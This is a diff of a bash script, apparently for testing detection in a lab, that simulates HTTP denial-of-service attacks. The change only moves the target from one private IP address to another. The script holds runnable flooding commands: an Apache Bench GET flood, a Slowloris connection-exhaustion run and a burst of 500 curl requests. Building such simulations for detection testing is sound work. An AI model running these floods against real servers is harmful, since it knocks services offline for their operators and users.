@@ -1,17 +1,17 @@
 #!/usr/bin/env bash
 
 echo "[+] Starting HTTP DoS/DDoS Attack Simulation"
-echo "[+] Target: http://172.20.0.60"
+echo "[+] Target: http://192.168.56.51"
 echo ""
 
 # Extrai apenas o IP/hostname sem http://
-TARGET_HOST=$(echo '172.20.0.60' | sed 's/http:\/\///' | sed 's/https:\/\///' | cut -d'/' -f1)
+TARGET_HOST=$(echo '192.168.56.51' | sed 's/http:\/\///' | sed 's/https:\/\///' | cut -d'/' -f1)
 
 # Ataque 1: Apache Bench - High Volume HTTP GET Flood
 echo "[1/4] Apache Bench - High Volume HTTP GET Flood"
 echo "      Sending 10000 requests with 200 concurrent connections..."
 # Aumentado para garantir detecção (10k requests, 200 concurrent)
-ab -n 10000 -c 200 -t 60 -k -r "http://172.20.0.60/" > /dev/null 2>&1 &
+ab -n 10000 -c 200 -t 60 -k -r "http://192.168.56.51/" > /dev/null 2>&1 &
 AB_PID=$!
 
 # Aguarda um pouco antes do próximo ataque
@@ -39,7 +39,7 @@ sleep 3
 # Ataque 3: Slowloris - Esgota conexões do servidor
 echo "[3/4] Slowloris - Connection Exhaustion Attack"
 echo "      Opening 200 slow connections to exhaust server resources..."
-timeout 30s slowloris '172.20.0.60' -s 200 -t 60 > /dev/null 2>&1 &
+timeout 30s slowloris '192.168.56.51' -s 200 -t 60 > /dev/null 2>&1 &
 SLOW_PID=$!
 
 # Aguarda um pouco antes do próximo ataque
@@ -55,7 +55,7 @@ for i in $(seq 1 500); do
          -H "User-Agent: Mozilla/5.0 (DoS-Test)" \
          -H "Connection: keep-alive" \
          --connect-timeout 2 --max-time 5 \
-         "http://172.20.0.60/" > /dev/null 2>&1 &
+         "http://192.168.56.51/" > /dev/null 2>&1 &
     
     if [ $((i % 50)) -eq 0 ]; then
         sleep 0.3
